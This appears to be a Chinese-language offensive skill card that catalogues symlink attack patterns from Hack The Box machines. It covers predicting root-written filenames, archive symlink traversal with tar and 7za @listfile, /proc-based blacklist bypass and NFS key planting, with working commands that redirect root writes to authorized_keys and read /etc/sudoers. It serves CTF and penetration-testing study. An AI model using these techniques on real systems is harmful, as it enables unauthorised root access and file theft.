---
name: 'symlink-attack-patterns'
description: '符号链接攻击模式库：可控文件名 + 高权写入 = 任意文件写。可预测文件名抢建 symlink / tar·7z 解包穿越 / /proc 软链任意读 / NFS 与可写挂载接力。（检索词：symlink/symlink attack/symbolic link/符号链接/软链接/ln -s/tar symlink/7za -snl/@listfile/proc symlink/fs.protected_symlinks/TOCTOU/任意文件写/arbitrary file write/symlink-attack/symbolic-link/tar-symlink/proc-symlink/arbitrary-file-write/patterns）'
whenToUse: '看到「文件名或路径部分可控」且「写入者 UID 比我高」的组合（定时任务写文件、归档解包、日志打包、NFS/可写挂载共享），或已有 LFI/任意读想升级为任意写时加载。'
metadata: { domain: linux, tier: T2 }
---

# 符号链接攻击模式库:可控文件名 + 高权写入 = 任意文件写

> 来自 Insane 官方 WP 逐台回核,**6 台命中**:Fatty / CTF / Ouija / CrossFit / Jail / Cobblestone(另有 Bookworm、Smasher 同族变体)。

**核心原语**:只要「文件名我可控」且「写入者权限比我高」,符号链接就把写操作重定向到任意路径。
两个条件分别问:**这个名字我能提前知道/提前创建吗?打开它的进程是 root 吗?**

## 触发信号

- `pspy64 -f` 看到 root 进程**周期性打开一个每轮名字都不同的文件**(时间戳/随机数/哈希当文件名)
- root cron / timer 里有 `tar`、`7za`、`scp`、`rsync`,且**打包或解包的目标目录对当前用户可写**
- 命令里出现 `-snl`(7-Zip 保存符号链接)、`@listfile`、`-- *` 这类"把文件名当数据读"的参数
- Web 应用有 `?file=` / `?log=` 参数,过滤是 `startsWith("/")` / `includes("..")` 这类**黑名单**,而非白名单
- 部署脚本里有 `ln -s <敏感路径> <web 可访问目录>`;或 `nmap --script=nfs-ls` 列出**可写** NFS 卷而当前 shell 是受限沙箱

## 前置验证

```bash
pspy64 -f                       # 谁在写?写哪个名字?以什么权限?
ls -la /var/local/ /opt/*/tar/  # 目标目录属主与权限位
sysctl fs.protected_symlinks    # =1 时 /tmp、/var/tmp 这类 sticky 世界可写目录拒跟随
# 内容格式:目标文件里该出现什么?authorized_keys 一行 = "ssh-rsa <公钥> root@kali"
```

## 模式 1: 高权进程按可预测名字写文件(→ 预测 + 抢建符号链接)

成立条件:写入者的**文件名由可预测 PRNG / 时间戳生成**。`rand()` 种子为 `time(NULL)` 且执行时刻固定 → 输出完全可预测。

```bash
# ① 定位写入逻辑(CrossFit:dbmsg 以 root 运行)
pspy64 -f                      # 看到每分钟打开 /usr/bin/dbmsg
# Ghidra:geteuid()==0 → srand(time(NULL)) → snprintf(buf,0x30,"%d%s",rand(),row_id)
#         → 取 MD5 作 /var/local/<md5> → 写入 name / message / email 三列

# ② 离线复刻下一分钟的文件名
#    seed = curr_time - (curr_time % 60) + 61; srand(seed); printf("%d", rand());

# ③ 抢建符号链接 + 投递内容(格式必须刚好是 authorized_keys 的一行)
ln -s /root/.ssh/authorized_keys /var/local/<md5>
mysql -u crossfit -p"oeLoo~y2baeni" crossfit -e "insert into messages(id,name,email,message) values(1337,'ssh-rsa','root@kali','<公钥>')"

# ④ cron 跑完,root 打开"文件"(实为软链)并把公钥写进 authorized_keys
ssh -i id_rsa root@crossfit.htb
```

**竞态变体**(名字不可预测,但检查与使用之间有窗口):`rm file; echo abc > file; checker file & sleep 0.5; rm file; ln -s /root/root.txt file`。

🔴 **`fs.protected_symlinks=1` 只保护 sticky 世界可写目录**(`/tmp`、`/dev/shm`)。在 `/tmp` 建链会失败;换到**自己拥有的可写目录**(`mkdir test; chmod 777 test`)再建链即可绕过 —— Bookworm 就是这么赢的。

### HTB 案例
| 机器 | 细节 |
|------|------|
| CrossFit | `dbmsg`(root)`srand(time(NULL))` → `/var/local/<md5> = md5(rand()+id)`;算出下一分钟名字后建链到 `/root/.ssh/authorized_keys`,再 insert 一行 `ssh-rsa <公钥> root@kali` |
| Smasher | SUID `checker` 检查后 `sleep`,窗口内 `ln -s /root/root.txt file` 读走 root flag(TOCTOU) |
| Bookworm | `/tmp` 建链被 `fs.protected_symlinks=1` 挡(500);改在 `frank` 家目录建链成功(200) |
| Cobblestone | 反向识别:`/bin/rbash` 只是 `bash` 的软链接,限制按启动名自动开启 —— 判断 shell 类型要看 `/etc/passwd` |

## 模式 2: 归档解包穿越(tar / 7z / zip 里的符号链接)

成立条件:**归档里能带符号链接条目**,且解包方或后续"覆盖同名文件"的动作以更高权限执行。

```bash
# 方向 A:容器构建期把软链打进 tar,宿主解包后留下软链,再由 scp 覆盖落到真身(Fatty)
ln -s /root/.ssh/authorized_keys logs.tar          # 容器内建链,打包后覆盖 /opt/fatty/tar/logs.tar
echo 'ssh-rsa AAAA...' > /opt/fatty/tar/logs.tar   # 宿主 cron 每分钟 scp 覆盖同名文件
# → 内容(公钥)写进 /root/.ssh/authorized_keys

# 方向 B:7-Zip 的 -snl 保存软链本身,@listfile 会"跟随"它并吐内容(CTF)
# 服务端命令:7za a /backup/$filename.zip -t7z -snl -p$pass -- *
ln -s /etc/sudoers uploads/listfile     # 用 apache 身份创建(自己对该目录无写权限)
touch uploads/@listfile
tail -f error.log                       # listfile 内容逐行打到 stderr
ln -s /root/root.txt uploads/listfile   # 同法读 root flag
```

`@listfile` 是"把文件当清单读"的运算符,会**跟随软链并把目标文件内容打到 stderr** → 无需任何读权限即任意文件读。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Fatty | 容器内建链 → 打进 tar → 覆盖 `/opt/fatty/tar/logs.tar` → 宿主 cron `scp` 覆盖同名路径 → root 公钥落地 |
| CTF | `7za a /backup/$filename.zip -t7z -snl -p$pass -- *`;`ln -s /etc/sudoers uploads/listfile` + `touch uploads/@listfile`,`tail -f error.log` 读到内容 |

🔴 跨边界时盯住三件事:**谁解包、解到哪、谁覆盖**。任意一个由 root 做,软链就从"一个文件"升级成"任意路径写"。

## 模式 3: `/proc` 符号链接做任意读

成立条件:应用的文件读做了**路径黑名单**(拒 `/` 开头、拒 `..`),但目录里存在一个指向 `/proc` 的软链。`/proc/<pid>/root/...` 以该进程的根目录解析路径 → 绕过黑名单。

```bash
ln -s /proc .config/bin/process_informations   # init.sh 留下的现成软链

# 黑名单:file.startsWith("/") || file.includes("..") —— 两条件都绕过
curl 'http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/etc/passwd' \
  -H "ihash: ..." -H "identification: ..."
curl '.../file/get?file=.config/bin/process_informations/self/environ'    # 确认进程属谁
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Ouija | `init.sh` 泄漏 `ln -s /proc .config/bin/process_informations`;用相对路径(不以 `/` 开头、不含 `..`)访问 `.../self/root/etc/passwd`,绕过过滤实现任意文件读 |

## 模式 4: 共享挂载接力(NFS / 可写挂载)

成立条件:受限沙箱只限制**进程能力**,不限制文件系统可见性 —— 借独立通道(NFS、容器挂载)把文件写到沙箱外。NFS 是双向的,枚举时必须**同时测挂载权限**。

```bash
nmap -sV --script=nfs-ls 10.10.10.34    # ① 枚举共享,重点看是否可写(不只看能否 mount)
# ② NFSShell> host 10.10.10.34 / mount /var/nfsshare
# ③ 借共享写 /home/frank/.ssh/authorized_keys(沙箱内 shell 做不到的事)
/var/nfsshare/writeup                   # ④ 执行共享里的脚本,再用私钥直接登录
ssh -i id_rsa frank@10.10.10.34
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Jail | 7411 端口溢出只拿到 SELinux 沙箱内执行;发现可写 `/var/nfsshare`,经 NFSShell 把公钥写进 `/home/frank/.ssh/authorized_keys` 逃出沙箱成为 `frank` |

## 快速检查清单

```bash
[ ] pspy64 -f 有没有 root 进程周期性打开"每轮名字不同"的文件?
[ ] 文件名来源是 rand()/time()/md5(可预测)还是内核随机(不可预测)?
[ ] root cron / timer 里有没有 tar、7za、scp、rsync,且目标目录我可写?
[ ] 命令里有没有 -snl、@listfile、-- * 这类"把文件名当数据读"的参数?
[ ] 应用的文件读过滤是黑名单吗?目录里有没有指向 /proc 的软链?
[ ] 有没有可写 NFS 卷 / 可写挂载点可以当"跨边界投递通道"?
[ ] sysctl fs.protected_symlinks 是否 =1?写入者与我的 UID 是否相同?
```

## 教训

1. **符号链接是"路径重定向原语",不是提权漏洞本身** —— 它只放大一个已有条件:文件名可控 + 写入者权限更高。缺一个都不成立。
2. **可预测性来自 PRNG 与调度节拍** —— `srand(time(NULL))` 加固定 cron 时刻 = 完全可预测;文件名带内核随机数就只能走竞态。
3. **归档是"符号链接的合法载体"** —— tar 默认保留软链,7-Zip 要显式 `-snl`;`@listfile` 会跟随软链读目标内容。
4. **黑名单挡不住软链** —— `startsWith("/")` 和 `includes("..")` 都拦不住目录里现成的 `/proc` 软链;白名单 + `realpath` 后校验才有效。
5. 🔴 **`fs.protected_symlinks=1` 不是终点,只是换目录**;🔴 **UID 相同则整个模式不成立** —— 同一 UID 下符号链接没有权限增益,先确认 `geteuid()`/服务运行账户。
6. **软链接改变的可能是"行为"而不只是"路径"** —— `/bin/rbash` 只是 `bash` 的软链接,限制按启动名自动开启;落地成登录才是终点(换成 `authorized_keys` 才有稳定会话)。

## 相关卡

- `authorized-keys-landing` —— 拿到写原语后怎么固化成 SSH 登录(软链接接力是其中一类)
- `sudo-escape-techniques` —— 只覆盖「双跳符号链接绕过脚本路径验证」一种变体,先看本卡拿全模式
- `cron-privesc-patterns` —— 只覆盖通配符注入(`tar`/`rsync` 文件名当选项);本卡管软链穿越
- `nfs-privesc` —— 模式 4 的 NFS 侧细节(`no_root_squash`、UID 匹配、showmount 枚举)
- `container-escape` —— 模式 2 的跨边界侧(容器/宿主挂载、打包-解包-覆盖)
